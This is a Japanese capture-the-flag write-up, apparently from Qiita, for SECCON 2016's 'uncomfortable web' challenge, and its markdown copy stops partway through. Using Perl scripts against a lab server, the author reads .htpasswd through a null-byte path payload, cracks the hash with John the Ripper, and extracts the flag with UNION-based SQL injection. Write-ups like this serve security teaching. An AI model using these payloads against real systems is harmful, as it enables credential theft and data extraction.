{"context": "\n\nuncomfortable web(Web, 300pts)\n\nAttack to http://127.0.0.1:81/authed/ through the uploaded script\nGet the flag in the database! \n\n\u81ea\u4f5c\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u30d5\u30a1\u30a4\u30eb\u3092\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u3068\u3001\u30ea\u30e2\u30fc\u30c8\u30b5\u30fc\u30d0\u4e0a\u3067\u5b9f\u884c\u3067\u304d\u307e\u3059\u3002\n\u30ed\u30fc\u30ab\u30eb\u304b\u3089\u306e\u307f\u30a2\u30af\u30bb\u30b9\u53ef\u80fd\u306a http://127.0.0.1:81/\u306b\u30a2\u30bf\u30c3\u30af\u3057\u3001flag\u3092\u63a2\u3059\u554f\u984c\u3067\u3059\u3002\nShell, Perl, Python \u304c\u9078\u629e\u3067\u304d\u3001\u4eca\u56de\u306f Perl \u3092\u4f7f\u7528\u3057\u307e\u3057\u305f\u3002\n\n\n\u30b5\u30f3\u30d7\u30eb\u30b9\u30af\u30ea\u30d7\u30c8\nhttp://127.0.0.1:81/ \u306b\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u9001\u4fe1\u3059\u308b\u30b5\u30f3\u30d7\u30eb\u304c\u914d\u5e03\u3055\u308c\u3066\u3044\u307e\u3057\u305f\u3002\n\u305d\u306e\u307e\u307e\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u3066\u5b9f\u884c\u3057\u3066\u307f\u307e\u3059\u3002\n\nsample\n#!/usr/bin/perl\nuse LWP::UserAgent;\nmy $ua = LWP::UserAgent->new;\nmy $req = HTTP::Request->new(GET => 'http://127.0.0.1:81/');\nmy $res = $ua->request($req);\nprint $res->content;\n\n\n\nsample-result\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<html>\n <head>\n  <title>Index of /</title>\n </head>\n <body>\n<h1>Index of /</h1>\n<table><tr><th><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr><tr><th colspan=\"5\"><hr></th></tr>\n<tr><td valign=\"top\"><img src=\"/icons/folder.gif\" alt=\"[DIR]\"></td><td><a href=\"authed/\">authed/</a></td><td align=\"right\">28-Nov-2016 10:51  </td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"select.cgi\">select.cgi</a></td><td align=\"right\">28-Nov-2016 10:08  </td><td align=\"right\">612 </td><td>&nbsp;</td></tr>\n<tr><th colspan=\"5\"><hr></th></tr>\n</table>\n<address>Apache Server at 127.0.0.1 Port 81</address>\n</body></html>\n\n\n\u51fa\u529b\u3055\u308c\u305fHTML\u3092\u30d6\u30e9\u30a6\u30b6\u306b\u8aad\u307f\u8fbc\u307e\u305b\u308b\u3068\u3053\u3046\u306a\u308a\u307e\u3059\u3002\n\n\n/authed \u306b\u30a2\u30af\u30bb\u30b9\n\u306f\u3058\u3081\u306b\u3001authed \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\u3092\u8a66\u307f\u307e\u3057\u305f\u3002\n\n01\n#!/usr/bin/perl\nuse LWP::UserAgent;\nuse DBI;\nmy $ua = LWP::UserAgent->new;\n\nmy $url = 'http://127.0.0.1:81/authed/';\nmy $req = HTTP::Request->new(GET => $url);\nmy $res = $ua->request($req);\nprint $res->content;\n\n\n\n401\u3067\u5f3e\u304b\u308c\u3066\u3057\u307e\u3044\u307e\u3059\u3002BASIC\u8a8d\u8a3c\u3092\u901a\u3059\u5fc5\u8981\u304c\u3042\u308a\u305d\u3046\u3067\u3059\u3002\n\nselect.cgi \u306b\u30a2\u30af\u30bb\u30b9\n\u30d5\u30a1\u30a4\u30eb select.cgi \u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001a, b \u306e\u30c9\u30ed\u30c3\u30d7\u30c0\u30a6\u30f3\u304c\u51fa\u3066\u304d\u307e\u3057\u305f\u3002\n\n02\n# \u5909\u66f4\u90e8\u5206\u4ee5\u5916\u306e\u30bd\u30fc\u30b9\u306f\u7701\u7565\u3057\u307e\u3059\u3002\n$url = 'http://127.0.0.1:81/select.cgi';\n\n\n\n02-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n</body></html>\n\n\n\n\nselect.cgi?txt=a \u306b\u30a2\u30af\u30bb\u30b9\na \u3092\u9078\u629e\u3057\u305f\u969b\u306eURL\u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001\u30c6\u30ad\u30b9\u30c8\u30d5\u30a1\u30a4\u30eb\u306e\u3088\u3046\u306a\u3082\u306e\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n03\n$url = 'http://127.0.0.1:81/select.cgi?txt=a';\n\n\n\n\nselect.cgi?txt=b \u306b\u30a2\u30af\u30bb\u30b9\nb \u3092\u9078\u629e\u3057\u305f\u969b\u306eURL\u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001\u540c\u3058\u304f\u30c6\u30ad\u30b9\u30c8\u30d5\u30a1\u30a4\u30eb\u306e\u3088\u3046\u306a\u3082\u306e\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n04\n$url = 'http://127.0.0.1:81/select.cgi?txt=b';\n\n\n\n04-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n<hr>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\n</body></html>\n\n\n\nselect.cgi?txt=c \u306b\u30a2\u30af\u30bb\u30b9\na b \u3068\u6765\u308b\u3068\u3001\u81ea\u7136\u3068 c \u3082\u8a66\u3057\u305f\u304f\u306a\u308b\u306e\u3067\u30a2\u30af\u30bb\u30b9\u3057\u3066\u307f\u307e\u3059\u3002\n\u3053\u3061\u3089\u3082\u540c\u3058\u304f\u3001\u4f55\u3084\u3089\u30c6\u30ad\u30b9\u30c8\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n05\n$url = 'http://127.0.0.1:81/select.cgi?txt=c';\n\n\n\n05-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n<hr>\n---<br>\nDo you want to enter authed/ directory?<br>\n---<br>\n</body></html>\n\n\n\nselect.cgi \u306e\u52d5\u4f5c\u306b\u3064\u3044\u3066\nselect.cgi \u306e\u3053\u308c\u307e\u3067\u306e\u52d5\u4f5c\u3092\u307e\u3068\u3081\u3066\u307f\u307e\u3059\u3002\n\n\n\n\u30d1\u30e9\u30e1\u30fc\u30bf\n\u8868\u793a\u3055\u308c\u305f\u30c6\u30ad\u30b9\u30c8\n\n\n\n\ntxt=a\nauthed/a.txt\n\n\ntxt=b\nauthed/b.txt\n\n\ntxt=c\nauthed/c.txt (?)\n\n\n\n\u30d1\u30e9\u30e1\u30fc\u30bf txt=XXXXX \u3092\u6e21\u3059\u3053\u3068\u3067\u3001authed/XXXXX.txt \u3092\u958b\u3051\u308b\u3053\u3068\u304c\u63a8\u6e2c\u3067\u304d\u307e\u3059\u3002\n\nauthed\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306eBASIC\u8a8d\u8a3c\u60c5\u5831\u3092\u53d6\u5f97\nBASIC\u8a8d\u8a3c\u306b\u4f7f\u7528\u3055\u308c\u308b .htpasswd \u3068\u547c\u3070\u308c\u308b\u30d5\u30a1\u30a4\u30eb\u3092\u63a2\u3057\u3066\u307f\u307e\u3059\u3002\nURL\u3092\u6b21\u306e\u3088\u3046\u306b\u6307\u5b9a\u3059\u308b\u3053\u3068\u3067 authed/.htpasswd \u3092\u8aad\u307f\u8fbc\u3080\u3053\u3068\u304c\u3067\u304d\u307e\u3057\u305f\u3002\n\n06\n$url = 'http://127.0.0.1:81/select.cgi?txt=.htpasswd%00';\n\n\n\n06-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n<hr>\nkeigo:LdnoMJCeVy.SE<br>\n</body></html>\n\n\n\u672b\u5c3e\u3092 %00 \u3068\u3059\u308b\u3053\u3068\u3067\u3001\u7d42\u7aef\u6587\u5b57 \\0 \u3068\u8a8d\u8b58\u3055\u305b\u3066\u3044\u307e\u3059\u3002\n\u7d42\u7aef\u6587\u5b57\u3092\u5229\u7528\u3059\u308b\u3068\u3001\u672b\u5c3e\u306b\u4ed8\u52a0\u3055\u308c\u308b .txt \u3092\u7121\u8996\u3055\u305b\u308b\u3053\u3068\u304c\u53ef\u80fd\u3067\u3059\u3002\n\n\n\n\u30d1\u30e9\u30e1\u30fc\u30bf\n\u958b\u304f\u30d5\u30a1\u30a4\u30eb\u540d\n\n\n\n\ntxt=a\nauthed/a.txt\n\n\ntxt=.htpasswd\nauthed/.htpasswd.txt\n\n\ntxt=.htpasswd%00\nauthed/.htpasswd\n\n\n\n\n.htpasswd \u3092\u89e3\u6790\n\u53d6\u5f97\u3067\u304d\u305f keigo:LdnoMJCeVy.SE \u3092\u89e3\u6790\u3057\u307e\u3059\u3002\nJohn the Ripper \u3092\u4f7f\u7528\u3059\u308b\u3068\u3001\u30e6\u30fc\u30b6\u540d keigo \u3001\u30d1\u30b9\u30ef\u30fc\u30c9 test \u3067\u3042\u308b\u3053\u3068\u304c\u5224\u660e\u3057\u307e\u3057\u305f\u3002\n> john.exe htpasswd\nLoaded 1 password hash (Traditional DES [128/128 BS SSE2])\ntest             (keigo)\nguesses: 1  time: 0:00:00:00 100% (2)  c/s: 230500  trying: orange - horses\nUse the \"--show\" option to display all of the cracked passwords reliably\n\n\nauthed \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\nBASIC\u8a8d\u8a3c\u306e\u60c5\u5831\u3092\u5165\u624b\u3067\u304d\u305f\u305f\u3081\u3001\u518d\u5ea6 authed \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\u3092\u8a66\u307f\u307e\u3059\u3002\n\n07\n(\u524d\u7565)\n$url = \"http://127.0.0.1:81/authed/\";\n$req = HTTP::Request->new(GET => $url);\n$req->authorization_basic('keigo', 'test');\n(\u5f8c\u7565)\n\n\n\n\u76f4\u4e0b\u306b sqlinj \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u304c\u3042\u308b\u3088\u3046\u3067\u3059\u3002\n\nauhted/sqlinj \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\nauthed/sqlinj \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\u3057\u3066\u307f\u307e\u3059\u3002\n\n08\n# \u5909\u66f4\u90e8\u5206\u4ee5\u5916\u306e\u30bd\u30fc\u30b9\u306f\u7701\u7565\u3057\u307e\u3059\u3002\n$url = \"http://127.0.0.1:81/authed/sqlinj/\";\n\n\n\n1.cgi \uff5e 100.cgi \u307e\u3067\u540c\u4e00\u30b5\u30a4\u30ba\u306e\u30d5\u30a1\u30a4\u30eb\u304c\u683c\u7d0d\u3055\u308c\u3066\u3044\u307e\u3057\u305f\u3002\u306a\u305c100\u500b\u3082\u2026\u2026\u3002\n\nauthed/sqlinj/1.cgi \u306b\u30a2\u30af\u30bb\u30b9\nauthed/sqlinj/1.cgi \u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001?no=4822267938 \u3078\u306e\u30ea\u30f3\u30af\u304c\u73fe\u308c\u307e\u3057\u305f\u3002\n\n09\n$url = \"http://127.0.0.1:81/authed/sqlinj/1.cgi\";\n\n\n\n09-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n</body></html>\n\n\n\n\nauthed/sqlinj/1.cgi?no=4822267938 \u306b\u30a2\u30af\u30bb\u30b9\n\u5148\u307b\u3069\u306e no \u30d1\u30e9\u30e1\u30fc\u30bf\u3092\u4ed8\u52a0\u3057\u3066\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001ISBN\u30b3\u30fc\u30c9\u7b49\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n10\n$url = \"http://127.0.0.1:81/authed/sqlinj/1.cgi?no=4822267938\";\n\n\n\n10-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: 4822267938<br>\nISBN-13: 978-4822267933<br>\nPUBLISH: 2016/2/19<p>\n</body></html>\n\n\n\nISBN\u30b3\u30fc\u30c9=\u66f8\u7c4d \u3067\u3059\u306e\u3067\u3001Amazon\u3067\u691c\u7d22\u3057\u3066\u307f\u307e\u3059\u3002\u2026\u2026\u3069\u3046\u3084\u3089\u5ba3\u4f1d(?)\u306e\u3088\u3046\u3067\u3059\u3002\nhttp://amazon.jp/dp/4822267938 \u2192 \u7d76\u5bfe\u308f\u304b\u308b\u30bb\u30b9\u30da27\u79cb 2016\u5e74\u6625\u7248\n\nSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\u8a66\u307f\u308b\n\nGet the flag in the database! \n\n\u51fa\u984c\u6587\u3092\u632f\u308a\u8fd4\u308b\u3068\u3001flag\u306f\u30c7\u30fc\u30bf\u30d9\u30fc\u30b9\u5185\u306b\u3042\u308b\u3088\u3046\u3067\u3059\u3002\n\u5148\u307b\u3069\u306eISBN\u60c5\u5831\u304cDB\u3067\u7ba1\u7406\u3055\u308c\u3066\u3044\u308b\u3068\u4eee\u5b9a\u3057\u3001SQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\u8a66\u3057\u307e\u3057\u305f\u3002\n\n11\n$url = \"http://127.0.0.1:81/authed/sqlinj/1.cgi?no=123' OR 1=1 --\";\n\n\n\n11-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\n</body></html>\n\n\n\u5931\u6557\u306e\u3088\u3046\u3067\u3059\u3002\u30d1\u30e9\u30e1\u30fc\u30bf\u3092\u6307\u5b9a\u3057\u306a\u304b\u3063\u305f\u5834\u5408\u3068\u540c\u4e00\u306eHTML\u304c\u8fd4\u3063\u3066\u304d\u307e\u3057\u305f\u3002\n\n100\u500b\u306eCGI\u306b\u5bfe\u3057\u3066\u653b\u6483\u3092\u8a66\u307f\u308b\n\u540c\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u5185\u306b\u5b58\u5728\u3059\u308b100\u500b\u306eCGI\u306b\u5bfe\u3057\u3066\u3001\u540c\u3058\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u6295\u3052\u3066\u307f\u307e\u3057\u305f\u3002\n\n12\nfor ($i = 1; $i <= 100; $i++){\n    print \"--- $i ---\\n\";\n    $url = \"http://127.0.0.1:81/authed/sqlinj/$i.cgi?no=123' OR 1=1 --\";\n    $req = HTTP::Request->new(GET => $url);\n    $req->authorization_basic('keigo', 'test');\n    $res = $ua->request($req);\n    print $res->content . \"\\n\\n\";\n}\n\n\n\n12-result(\u629c\u7c8b)\n--- 72 ---\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: 4822267865<br>\nISBN-13: 978-4822267865<br>\nPUBLISH: 2015/2/20<p>\nISBN-10: 4822267911<br>\nISBN-13: 978-4822267919<br>\nPUBLISH: 2015/8/27<p>\nISBN-10: 4822267938<br>\nISBN-13: 978-4822267933<br>\nPUBLISH: 2016/2/19<p>\nISBN-10: 4822237842<br>\nISBN-13: 978-4822237844<br>\nPUBLISH: 2016/8/25<p>\n</body></html>\n\n\nhttp://127.0.0.1:81/authed/sqlinj/72.cgi \u306e\u307f\u3001\u30c6\u30fc\u30d6\u30eb\u5185\u306e\u5168\u30ec\u30b3\u30fc\u30c9\u3092\u8fd4\u3057\u3066\u304d\u307e\u3057\u305f\u3002\n\u79c1\u306eSQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u529b\u304c\u4e0d\u8db3\u3057\u3066\u3044\u305f\u305f\u3081\u3001\u4ee5\u5f8c\u306e\u624b\u9806\u306f\u3001\u4ed6\u306e\u65b9\u306e\u89e3\u6cd5\u3092\u53c2\u8003\u306b\u3057\u3064\u3064\u89e3\u304d\u9032\u3081\u305f\u5185\u5bb9\u3068\u306a\u3063\u3066\u3044\u307e\u3059\u3002\n\n72.cgi \u3092\u5229\u7528\u3057\u3066DB\u5185\u3092\u63a2\u7d22\nSQLite\u3068\u4eee\u5b9a\u3057\u305f\u5834\u5408\u3001sqlite_master \u304b\u3089DB\u5185\u306e\u30c6\u30fc\u30d6\u30eb\u4e00\u89a7\u3092\u5165\u624b\u3059\u308b\u3053\u3068\u304c\u53ef\u80fd\u3067\u3059\u3002\n\u51fa\u529b\u3055\u308c\u308b\u30ab\u30e9\u30e0\u304c3\u3064 (ISBN-10, ISBN-13, PUBLISH) \u306e\u305f\u3081\u3001\u30ab\u30e9\u30e0\u6570\u3092\u63c3\u3048\u305f\u4e0a\u3067 UNION \u3092\u4f7f\u7528\u3057\u3066 sqlite_master \u3092\u53c2\u7167\u3057\u307e\u3059\u3002\n\n13\n$url = \"http://127.0.0.1:81/authed/sqlinj/72.cgi?no=123' UNION SELECT name, sql, 0 FROM sqlite_master --\";\n\n\n\n13-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: books<br>\nISBN-13: CREATE TABLE books (isbn10,isbn13,date)<br>\nPUBLISH: 0<p>\nISBN-10: f1ags<br>\nISBN-13: CREATE TABLE f1ags (f1ag)<br>\nPUBLISH: 0<p>\n</body></html>\n\n\nbooks \u30c6\u30fc\u30d6\u30eb\u3068 f1ags \u30c6\u30fc\u30d6\u30eb\u304c\u5b58\u5728\u3057\u3066\u3044\u308b\u3053\u3068\u304c\u5224\u660e\u3057\u307e\u3057\u305f\u3002\n\nflag\u3092\u53d6\u5f97\n\u5148\u307b\u3069\u5224\u660e\u3057\u305f f1ags \u30c6\u30fc\u30d6\u30eb\u306e f1ag \u30ab\u30e9\u30e0\u3092\u53d6\u5f97\u3057\u307e\u3059\u3002\n\u30ab\u30e9\u30e0\u6570\u3092\u63c3\u3048\u308b\u3053\u3068\u3092\u5fd8\u308c\u305a\u306b\u3002\n\n14\n$url = \"http://127.0.0.1:81/authed/sqlinj/72.cgi?no=123' UNION SELECT f1ag, 0, 0 FROM f1ags --\";\n\n\n\n14-result\n<html>\n<head>\n  <title>SECCON 2016 Online</title>\n  <!-- by KeigoYAMAZAKI, 2016.11.08- -->\n</head>\n<body>\n<a href=\"?no=4822267938\">link</a>\n<hr>\nISBN-10: SECCON{I want to eventually make a CGC web edition... someday...}<br>\nISBN-13: 0<br>\nPUBLISH: 0<p>\n</body></html>\n\n\n\nflag\nSECCON{I want to eventually make a CGC web edition... someday...}\n\n\n\u4ee5\u4e0a\u3067\u3059\u3002\n#uncomfortable web(Web, 300pts)\n>Attack to http://127.0.0.1:81/authed/ through the uploaded script\n>Get the flag in the database! \n\n\u81ea\u4f5c\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u30d5\u30a1\u30a4\u30eb\u3092\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3059\u308b\u3068\u3001\u30ea\u30e2\u30fc\u30c8\u30b5\u30fc\u30d0\u4e0a\u3067\u5b9f\u884c\u3067\u304d\u307e\u3059\u3002\n\u30ed\u30fc\u30ab\u30eb\u304b\u3089\u306e\u307f\u30a2\u30af\u30bb\u30b9\u53ef\u80fd\u306a `http://127.0.0.1:81/`\u306b\u30a2\u30bf\u30c3\u30af\u3057\u3001flag\u3092\u63a2\u3059\u554f\u984c\u3067\u3059\u3002\nShell, Perl, Python \u304c\u9078\u629e\u3067\u304d\u3001\u4eca\u56de\u306f Perl \u3092\u4f7f\u7528\u3057\u307e\u3057\u305f\u3002\n\n![uncomfortableweb.png](https://qiita-image-store.s3.amazonaws.com/0/144905/b14d628d-b7e4-5f45-6c5d-ba828aacbe54.png)\n\n\n## \u30b5\u30f3\u30d7\u30eb\u30b9\u30af\u30ea\u30d7\u30c8\n`http://127.0.0.1:81/` \u306b\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u9001\u4fe1\u3059\u308b\u30b5\u30f3\u30d7\u30eb\u304c\u914d\u5e03\u3055\u308c\u3066\u3044\u307e\u3057\u305f\u3002\n\u305d\u306e\u307e\u307e\u30a2\u30c3\u30d7\u30ed\u30fc\u30c9\u3057\u3066\u5b9f\u884c\u3057\u3066\u307f\u307e\u3059\u3002\n\n```pl:sample\n#!/usr/bin/perl\nuse LWP::UserAgent;\nmy $ua = LWP::UserAgent->new;\nmy $req = HTTP::Request->new(GET => 'http://127.0.0.1:81/');\nmy $res = $ua->request($req);\nprint $res->content;\n```\n\n```html:sample-result\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\">\n<html>\n <head>\n  <title>Index of /</title>\n </head>\n <body>\n<h1>Index of /</h1>\n<table><tr><th><img src=\"/icons/blank.gif\" alt=\"[ICO]\"></th><th><a href=\"?C=N;O=D\">Name</a></th><th><a href=\"?C=M;O=A\">Last modified</a></th><th><a href=\"?C=S;O=A\">Size</a></th><th><a href=\"?C=D;O=A\">Description</a></th></tr><tr><th colspan=\"5\"><hr></th></tr>\n<tr><td valign=\"top\"><img src=\"/icons/folder.gif\" alt=\"[DIR]\"></td><td><a href=\"authed/\">authed/</a></td><td align=\"right\">28-Nov-2016 10:51  </td><td align=\"right\">  - </td><td>&nbsp;</td></tr>\n<tr><td valign=\"top\"><img src=\"/icons/text.gif\" alt=\"[TXT]\"></td><td><a href=\"select.cgi\">select.cgi</a></td><td align=\"right\">28-Nov-2016 10:08  </td><td align=\"right\">612 </td><td>&nbsp;</td></tr>\n<tr><th colspan=\"5\"><hr></th></tr>\n</table>\n<address>Apache Server at 127.0.0.1 Port 81</address>\n</body></html>\n```\n\n\u51fa\u529b\u3055\u308c\u305fHTML\u3092\u30d6\u30e9\u30a6\u30b6\u306b\u8aad\u307f\u8fbc\u307e\u305b\u308b\u3068\u3053\u3046\u306a\u308a\u307e\u3059\u3002\n\n![01.png](https://qiita-image-store.s3.amazonaws.com/0/144905/29d5666f-ca79-d600-27c6-908ee0fc9653.png)\n\n## /authed \u306b\u30a2\u30af\u30bb\u30b9\n\u306f\u3058\u3081\u306b\u3001`authed` \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b\u30a2\u30af\u30bb\u30b9\u3092\u8a66\u307f\u307e\u3057\u305f\u3002\n\n```pl:01\n#!/usr/bin/perl\nuse LWP::UserAgent;\nuse DBI;\nmy $ua = LWP::UserAgent->new;\n\nmy $url = 'http://127.0.0.1:81/authed/';\nmy $req = HTTP::Request->new(GET => $url);\nmy $res = $ua->request($req);\nprint $res->content;\n```\n![01.png](https://qiita-image-store.s3.amazonaws.com/0/144905/e9fec0c7-15e4-62da-5734-25916def98b9.png)\n\n401\u3067\u5f3e\u304b\u308c\u3066\u3057\u307e\u3044\u307e\u3059\u3002BASIC\u8a8d\u8a3c\u3092\u901a\u3059\u5fc5\u8981\u304c\u3042\u308a\u305d\u3046\u3067\u3059\u3002\n\n## select.cgi \u306b\u30a2\u30af\u30bb\u30b9\n\u30d5\u30a1\u30a4\u30eb `select.cgi` \u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001a, b \u306e\u30c9\u30ed\u30c3\u30d7\u30c0\u30a6\u30f3\u304c\u51fa\u3066\u304d\u307e\u3057\u305f\u3002\n\n```pl:02\n# \u5909\u66f4\u90e8\u5206\u4ee5\u5916\u306e\u30bd\u30fc\u30b9\u306f\u7701\u7565\u3057\u307e\u3059\u3002\n$url = 'http://127.0.0.1:81/select.cgi';\n```\n\n```html:02-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n</body></html>\n```\n![02.png](https://qiita-image-store.s3.amazonaws.com/0/144905/c526f6d1-8cc6-3761-ded0-abfa6ac9849e.png)\n\n## select.cgi?txt=a \u306b\u30a2\u30af\u30bb\u30b9\n`a` \u3092\u9078\u629e\u3057\u305f\u969b\u306eURL\u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001\u30c6\u30ad\u30b9\u30c8\u30d5\u30a1\u30a4\u30eb\u306e\u3088\u3046\u306a\u3082\u306e\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n```pl:03\n$url = 'http://127.0.0.1:81/select.cgi?txt=a';\n```\n![03.png](https://qiita-image-store.s3.amazonaws.com/0/144905/aad09193-08a5-f666-3ae2-e96e7d1a0c4e.png)\n\n\n## select.cgi?txt=b \u306b\u30a2\u30af\u30bb\u30b9\n`b` \u3092\u9078\u629e\u3057\u305f\u969b\u306eURL\u306b\u30a2\u30af\u30bb\u30b9\u3059\u308b\u3068\u3001\u540c\u3058\u304f\u30c6\u30ad\u30b9\u30c8\u30d5\u30a1\u30a4\u30eb\u306e\u3088\u3046\u306a\u3082\u306e\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n```pl:04\n$url = 'http://127.0.0.1:81/select.cgi?txt=b';\n```\n\n```html:04-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n<hr>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\nauthed/b.txt<br>\n</body></html>\n```\n\n## select.cgi?txt=c \u306b\u30a2\u30af\u30bb\u30b9\n`a` `b` \u3068\u6765\u308b\u3068\u3001\u81ea\u7136\u3068 `c` \u3082\u8a66\u3057\u305f\u304f\u306a\u308b\u306e\u3067\u30a2\u30af\u30bb\u30b9\u3057\u3066\u307f\u307e\u3059\u3002\n\u3053\u3061\u3089\u3082\u540c\u3058\u304f\u3001\u4f55\u3084\u3089\u30c6\u30ad\u30b9\u30c8\u304c\u8868\u793a\u3055\u308c\u307e\u3057\u305f\u3002\n\n```pl:05\n$url = 'http://127.0.0.1:81/select.cgi?txt=c';\n```\n\n```html:05-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" vaue=\"GO\">\n</form>\n<hr>\n---<br>\nDo you want to enter authed/ directory?<br>\n---<br>\n</body></html>\n```\n\n## select.cgi \u306e\u52d5\u4f5c\u306b\u3064\u3044\u3066\n`select.cgi` \u306e\u3053\u308c\u307e\u3067\u306e\u52d5\u4f5c\u3092\u307e\u3068\u3081\u3066\u307f\u307e\u3059\u3002\n\n| \u30d1\u30e9\u30e1\u30fc\u30bf | \u8868\u793a\u3055\u308c\u305f\u30c6\u30ad\u30b9\u30c8 |\n|:-:|:-:|:-:|\n| txt=a | authed/a.txt |\n| txt=b | authed/b.txt |\n| txt=c | authed/c.txt (?) |\n\n\u30d1\u30e9\u30e1\u30fc\u30bf `txt=XXXXX` \u3092\u6e21\u3059\u3053\u3068\u3067\u3001`authed/XXXXX.txt` \u3092\u958b\u3051\u308b\u3053\u3068\u304c\u63a8\u6e2c\u3067\u304d\u307e\u3059\u3002\n\n## authed\u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306eBASIC\u8a8d\u8a3c\u60c5\u5831\u3092\u53d6\u5f97\nBASIC\u8a8d\u8a3c\u306b\u4f7f\u7528\u3055\u308c\u308b `.htpasswd` \u3068\u547c\u3070\u308c\u308b\u30d5\u30a1\u30a4\u30eb\u3092\u63a2\u3057\u3066\u307f\u307e\u3059\u3002\nURL\u3092\u6b21\u306e\u3088\u3046\u306b\u6307\u5b9a\u3059\u308b\u3053\u3068\u3067 `authed/.htpasswd` \u3092\u8aad\u307f\u8fbc\u3080\u3053\u3068\u304c\u3067\u304d\u307e\u3057\u305f\u3002\n\n```pl:06\n$url = 'http://127.0.0.1:81/select.cgi?txt=.htpasswd%00';\n```\n\n```html:06-result\n<html>\n<body>\n<form action=\"?\" method=\"get\">\n<select name=\"txt\">\n<option value=\"a\">a</option>\n<option value=\"b\">b</option>\n</select>\n<input type=\"submit\" 